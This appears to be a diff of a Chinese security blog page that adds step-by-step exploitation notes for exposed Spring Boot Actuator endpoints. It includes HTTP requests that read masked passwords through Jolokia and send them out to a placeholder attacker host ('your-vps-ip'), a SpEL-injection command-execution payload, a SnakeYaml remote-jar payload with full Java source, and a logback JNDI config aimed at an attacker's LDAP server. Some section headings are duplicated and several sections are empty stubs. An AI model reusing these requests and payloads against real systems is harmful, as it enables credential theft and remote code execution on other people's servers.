@@ -635,25 +635,152 @@
 <p>在 Spring Boot 中，Jolokia 可以作为一个端点集成到 Actuator 中，从而允许开发人员通过 RESTful API 远程监控和管理应用程序。</p>
 <p>1、先通过&#x2F;env接口获得带*号的密码，并复制对应的属性</p>
 <p>2、调用相关Mbean获取明文</p>
-<p>实际上是调用 org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar 类实例的 getProperty 方法</p>
+<p>调用 org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar 类实例的 getProperty 方法</p>
 <p>spring 1.x</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /jolokia</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.boot:name=SpringApplication,type=Admin&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;</span><br></pre></td></tr></table></figure>
 
 <p>spring 2.x</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/jolokia</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.boot:name=SpringApplication,type=Admin&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;</span><br></pre></td></tr></table></figure>
 
+<p>调用 org.springframework.cloud.context.environment.EnvironmentManager 类实例的 getProperty 方法</p>
+<p>spring 1.x</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /jolokia</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;</span><br></pre></td></tr></table></figure>
+
+<p>spring 2.x</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/jolokia</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="4、脱敏密码明文"><a href="#4、脱敏密码明文" class="headerlink" title="4、脱敏密码明文"></a>4、脱敏密码明文</h3><p>1、可以 GET 请求目标网站的&#x2F;env</p>
+<p>2、可以 POST 请求目标网站的&#x2F;env</p>
+<p>3、可以 POST 请求目标网站的&#x2F;refresh接口刷新配置（存在spring-boot-starter-actuator&#96;依赖）</p>
+<p>4、目标使用了spring-cloud-starter-netflix-eureka-client&#96;依赖</p>
+<p>5、目标可以请求攻击者的服务器（请求可出外网）</p>
+<p>还是先找到想要的星号密码属性名</p>
+<p><strong>设置 eureka.client.serviceUrl.defaultZone 属性</strong></p>
+<p>security.user.password是要获取的密码的属性名</p>
+<p>spring 1.x</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">eureka.client.serviceUrl.defaultZone=http://value:$&#123;security.user.password&#125;@your-vps-ip</span><br></pre></td></tr></table></figure>
+
+<p>spring 2.x</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http://value:$&#123;security.user.password&#125;@your-vps-ip&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>刷新配置</strong></p>
+<p>spring 1.x</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /refresh</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure>
+
+<p>spring 2.x</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/refresh</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure>
+
+<p><strong>将获得的值进行base64解码</strong></p>
+<h3 id="5、脱敏密码明文"><a href="#5、脱敏密码明文" class="headerlink" title="5、脱敏密码明文"></a>5、脱敏密码明文</h3><p>1、通过 POST&#x2F;env&#96;设置属性触发目标对外网指定地址发起任意 http 请求</p>
+<p>2、目标可以请求攻击者的服务器（请求可出外网）</p>
+<p>在上一个的基础上还是启动一个监听nc</p>
+<p><strong>触发对外 http 请求</strong></p>
+<p>spring.cloud.bootstrap.location方法 		<strong>适用于</strong>明文数据中有特殊 url 字符的情况</p>
+<p>spring 1.x</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.cloud.bootstrap.location=http://your-vps-ip/?=$&#123;security.user.password&#125;</span><br></pre></td></tr></table></figure>
+
+<p>spring 2.x</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.cloud.bootstrap.location&quot;,&quot;value&quot;:&quot;http://your-vps-ip/?=$&#123;security.user.password&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>eureka.client.serviceUrl.defaultZone方法 	<strong>不适用于</strong>明文数据中有特殊 url 字符的情况</p>
+<p>spring 1.x</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">eureka.client.serviceUrl.defaultZone=http://your-vps-ip/$&#123;security.user.password&#125;</span><br></pre></td></tr></table></figure>
+
+<p>spring 2.x</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http://your-vps-ip/$&#123;security.user.password&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>刷新配置</strong></p>
+<p>spring 1.x</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /refresh</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure>
+
+<p>spring 2.x</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/refresh</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure>
+
+<h3 id="5、脱敏密码明文-1"><a href="#5、脱敏密码明文-1" class="headerlink" title="5、脱敏密码明文"></a>5、脱敏密码明文</h3><h3 id="6、基于SpEL注入的RCE"><a href="#6、基于SpEL注入的RCE" class="headerlink" title="6、基于SpEL注入的RCE"></a>6、基于SpEL注入的RCE</h3><p>1、spring boot 1.1.0-1.1.12、1.2.0-1.2.7、1.3.0</p>
+<p>2、至少知道一个触发 springboot 默认错误页面的接口及参数名</p>
+<p>假如有个接口存在传参，并传入值，返回的是500状态码+whitelabel error page则这里很大概率存在spel注入</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/common/202408221535388.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/common/202408221535388.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<p>然后去尝试${}，表达式中用运算的形式，观察是否有运算后的值返回，有则可以确定是spel注入</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/common/202408221536081.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/common/202408221536081.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<p>将payload转hex进制形式</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">target = <span class="string">&#x27;open -a Calculator&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> target:</span><br><span class="line">    result += <span class="built_in">hex</span>(<span class="built_in">ord</span>(x)) + <span class="string">&quot;,&quot;</span></span><br><span class="line"><span class="built_in">print</span>(result.rstrip(<span class="string">&#x27;,&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行</span></span><br><span class="line">$&#123;T(java.lang.Runtime).getRuntime().<span class="built_in">exec</span>(new String(new byte[]&#123;<span class="number">0x6f</span>,<span class="number">0x70</span>,<span class="number">0x65</span>,<span class="number">0x6e</span>,<span class="number">0x20</span>,<span class="number">0x2d</span>,<span class="number">0x61</span>,<span class="number">0x20</span>,<span class="number">0x43</span>,<span class="number">0x61</span>,<span class="number">0x6c</span>,<span class="number">0x63</span>,<span class="number">0x75</span>,<span class="number">0x6c</span>,<span class="number">0x61</span>,<span class="number">0x74</span>,<span class="number">0x6f</span>,<span class="number">0x72</span>&#125;))&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/common/202408221533996.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/common/202408221533996.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<h3 id="7、SpringCloud的SnakeYaml的RCE"><a href="#7、SpringCloud的SnakeYaml的RCE" class="headerlink" title="7、SpringCloud的SnakeYaml的RCE"></a>7、SpringCloud的SnakeYaml的RCE</h3><p>1、可以 POST 请求目标网站的&#x2F;env&#96;接口设置属性</p>
+<p>2、可以 POST 请求目标网站的 &#x2F;refresh接口刷新配置（存在spring-boot-starter-actuator&#96;依赖）</p>
+<p>3、目标依赖的spring-cloud-starte 版本 &lt; 1.3.0.RELEASE</p>
+<p>4、目标可以请求攻击者的 HTTP 服务器（请求可出外网）</p>
+<p><strong>托管jar和yml文件</strong></p>
+<p>yml文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">!!javax.script.ScriptEngineManager [</span><br><span class="line">  !!java.net.URLClassLoader [[</span><br><span class="line">    !!java.net.URL [&quot;http://your-vps-ip/example.jar&quot;]</span><br><span class="line">  ]]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+
+<p>jar包文件根据<a target="_blank" rel="noopener" href="https://github.com/artsploit/yaml-payload%E6%9D%A5%E7%BC%96%E5%86%99">https://github.com/artsploit/yaml-payload来编写</a></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> artsploit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngine;</span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngineFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AwesomeScriptEngineFactory</span> <span class="keyword">implements</span> <span class="title class_">ScriptEngineFactory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">AwesomeScriptEngineFactory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;open -a Calculator&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getEngineName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getEngineVersion</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">getExtensions</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">getMimeTypes</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">getNames</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getLanguageName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getLanguageVersion</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getParameter</span><span class="params">(String key)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getMethodCallSyntax</span><span class="params">(String obj, String m, String... args)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getOutputStatement</span><span class="params">(String toDisplay)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getProgram</span><span class="params">(String... statements)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ScriptEngine <span class="title function_">getScriptEngine</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac src/artsploit/AwesomeScriptEngineFactory.java</span><br><span class="line">jar -cvf yaml-payload.jar -C src/ .</span><br></pre></td></tr></table></figure>
+
+<p><strong>设置 spring.cloud.bootstrap.location 属性</strong></p>
+<p>spring 1.x</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.cloud.bootstrap.location=http://your-vps-ip/example.yml</span><br></pre></td></tr></table></figure>
+
+<p>spring 2.x</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.cloud.bootstrap.location&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.yml&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>刷新</strong></p>
+<p>spring 1.x</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /refresh</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure>
+
+<p>spring 2.x</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/refresh</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/common/202408221602099.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/common/202408221602099.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<h3 id="8、eureka中xstream基于反序列化的RCE"><a href="#8、eureka中xstream基于反序列化的RCE" class="headerlink" title="8、eureka中xstream基于反序列化的RCE"></a>8、eureka中xstream基于反序列化的RCE</h3><p>1、可以 POST 请求目标网站的&#x2F;env接口设置属性</p>
+<p>2、可以 POST 请求目标网站的&#x2F;refresh接口刷新配置（存在spring-boot-starter-actuator&#96;依赖）</p>
+<p>3、目标使用的eureka-client&lt; 1.8.7（通常包含在spring-cloud-starter-netflix-eureka-client&#96;依赖中）</p>
+<p>4、目标可以请求攻击者的 HTTP 服务器（请求可出外网）</p>
+<p><strong>架设响应恶意 XStream payload 的网站</strong></p>
+<p>反弹一个nc</p>
+<p><strong>设置 eureka.client.serviceUrl.defaultZone 属性</strong></p>
+<p>spring 1.x</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">eureka.client.serviceUrl.defaultZone=http://your-vps-ip/example</span><br></pre></td></tr></table></figure>
+
+<p>spring 2.x</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>刷新配置</strong></p>
+<p>spring 1.x</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /refresh</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure>
+
+<p>spring 2.x</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/refresh</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure>
 
 
-<h3 id="4、脱敏密码明文"><a href="#4、脱敏密码明文" class="headerlink" title="4、脱敏密码明文"></a>4、脱敏密码明文</h3><h3 id="5、脱敏密码明文"><a href="#5、脱敏密码明文" class="headerlink" title="5、脱敏密码明文"></a>5、脱敏密码明文</h3><h3 id="6、脱敏密码明文"><a href="#6、脱敏密码明文" class="headerlink" title="6、脱敏密码明文"></a>6、脱敏密码明文</h3><h3 id="7、基于SpEL注入的RCE"><a href="#7、基于SpEL注入的RCE" class="headerlink" title="7、基于SpEL注入的RCE"></a>7、基于SpEL注入的RCE</h3><h3 id="8、SpringCloud的SnakeYaml的RCE"><a href="#8、SpringCloud的SnakeYaml的RCE" class="headerlink" title="8、SpringCloud的SnakeYaml的RCE"></a>8、SpringCloud的SnakeYaml的RCE</h3><h3 id="9、eureka中xstream基于反序列化的RCE"><a href="#9、eureka中xstream基于反序列化的RCE" class="headerlink" title="9、eureka中xstream基于反序列化的RCE"></a>9、eureka中xstream基于反序列化的RCE</h3><h3 id="10、jolokia中logback基于JNDI注入的RCE"><a href="#10、jolokia中logback基于JNDI注入的RCE" class="headerlink" title="10、jolokia中logback基于JNDI注入的RCE"></a>10、jolokia中logback基于JNDI注入的RCE</h3><h3 id="11、jolokia中realm基于JNDI注入的RCE"><a href="#11、jolokia中realm基于JNDI注入的RCE" class="headerlink" title="11、jolokia中realm基于JNDI注入的RCE"></a>11、jolokia中realm基于JNDI注入的RCE</h3><h3 id="12、H2数据库设置query属性的RCE-x2F-restart"><a href="#12、H2数据库设置query属性的RCE-x2F-restart" class="headerlink" title="12、H2数据库设置query属性的RCE  &#x2F;restart"></a>12、H2数据库设置query属性的RCE  &#x2F;restart</h3><h3 id="13、h2数据库的控制台基于JNDI注入的RCE"><a href="#13、h2数据库的控制台基于JNDI注入的RCE" class="headerlink" title="13、h2数据库的控制台基于JNDI注入的RCE"></a>13、h2数据库的控制台基于JNDI注入的RCE</h3><h3 id="14、mysql中jdbc基于反序列化的RCE"><a href="#14、mysql中jdbc基于反序列化的RCE" class="headerlink" title="14、mysql中jdbc基于反序列化的RCE"></a>14、mysql中jdbc基于反序列化的RCE</h3><h3 id="15、logging-config的logback基于JNDI的RCE-x2F-restart"><a href="#15、logging-config的logback基于JNDI的RCE-x2F-restart" class="headerlink" title="15、logging.config的logback基于JNDI的RCE  &#x2F;restart"></a>15、logging.config的logback基于JNDI的RCE  &#x2F;restart</h3><h3 id="16、logging-config的groovyRCE-x2F-restart"><a href="#16、logging-config的groovyRCE-x2F-restart" class="headerlink" title="16、logging.config的groovyRCE  &#x2F;restart"></a>16、logging.config的groovyRCE  &#x2F;restart</h3><p>1、可以 POST 请求目标网站的&#x2F;env接口设置属性</p>
+
+<h3 id="9、jolokia中logback基于JNDI注入的RCE"><a href="#9、jolokia中logback基于JNDI注入的RCE" class="headerlink" title="9、jolokia中logback基于JNDI注入的RCE"></a>9、jolokia中logback基于JNDI注入的RCE</h3><p>1、目标网站存在&#x2F;jolokia或&#x2F;actuator&#x2F;jolokia&#96;接口</p>
+<p>2、目标使用了jolokia-core&#96;依赖（版本要求暂未知）并且环境中存在相关 MBean</p>
+<p>3、目标可以请求攻击者的 HTTP 服务器（请求可出外网）</p>
+<p>4、普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201&#x2F;7u191&#x2F;8u182&#x2F;11.0.1(LDAP)，但相关环境可绕过</p>
+<p><strong>查看已存在的 MBeans</strong></p>
+<p>找到<strong>ch.qos.logback.classic.jmx.JMXConfigurator</strong>和<strong>reloadByURL</strong></p>
+<p><strong>托管xml</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line">  &lt;insertFromJNDI env-entry-name=&quot;ldap://your-vps-ip:1389/JNDIObject&quot; as=&quot;appName&quot; /&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="10、jolokia中realm基于JNDI注入的RCE"><a href="#10、jolokia中realm基于JNDI注入的RCE" class="headerlink" title="10、jolokia中realm基于JNDI注入的RCE"></a>10、jolokia中realm基于JNDI注入的RCE</h3><h3 id="11、H2数据库设置query属性的RCE-x2F-restart"><a href="#11、H2数据库设置query属性的RCE-x2F-restart" class="headerlink" title="11、H2数据库设置query属性的RCE  &#x2F;restart"></a>11、H2数据库设置query属性的RCE  &#x2F;restart</h3><h3 id="12、h2数据库的控制台基于JNDI注入的RCE"><a href="#12、h2数据库的控制台基于JNDI注入的RCE" class="headerlink" title="12、h2数据库的控制台基于JNDI注入的RCE"></a>12、h2数据库的控制台基于JNDI注入的RCE</h3><h3 id="13、mysql中jdbc基于反序列化的RCE"><a href="#13、mysql中jdbc基于反序列化的RCE" class="headerlink" title="13、mysql中jdbc基于反序列化的RCE"></a>13、mysql中jdbc基于反序列化的RCE</h3><h3 id="14、logging-config的logback基于JNDI的RCE-x2F-restart"><a href="#14、logging-config的logback基于JNDI的RCE-x2F-restart" class="headerlink" title="14、logging.config的logback基于JNDI的RCE  &#x2F;restart"></a>14、logging.config的logback基于JNDI的RCE  &#x2F;restart</h3><p>1、可以 POST 请求目标网站的&#x2F;env接口设置属性</p>
+<p>2、可以 POST 请求目标网站的&#x2F;restart接口重启应用</p>
+<p>3、普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201&#x2F;7u191&#x2F;8u182&#x2F;11.0.1(LDAP)，但相关环境可绕过</p>
+<p>4、 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</p>
+<p>5、 HTTP 服务器如果返回含有畸形 xml 语法内容的文件，会导致程序异常退出</p>
+<p>6、 JNDI 服务返回的 object 需要实现javax.naming.spi.ObjectFactory&#96;接口，否则会导致程序异常退出</p>
+<h3 id="15、logging-config的groovyRCE-x2F-restart"><a href="#15、logging-config的groovyRCE-x2F-restart" class="headerlink" title="15、logging.config的groovyRCE  &#x2F;restart"></a>15、logging.config的groovyRCE  &#x2F;restart</h3><p>1、可以 POST 请求目标网站的&#x2F;env接口设置属性</p>
 <p>2、可以 POST 请求目标网站的 &#x2F;restart&#96;接口重启应用</p>
 <p>注：1、目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</p>
 <p>​		2、 HTTP 服务器如果返回含有畸形 groovy 语法内容的文件，会导致程序异常退出</p>
 <p>​		3、环境中需要存在 groovy 依赖，否则会导致程序异常退出</p>
-<p><strong>托管groovy结尾文件</strong></p>
+<p><strong>托管groovy文件</strong></p>
 <p>并在里面输入要执行的命令</p>
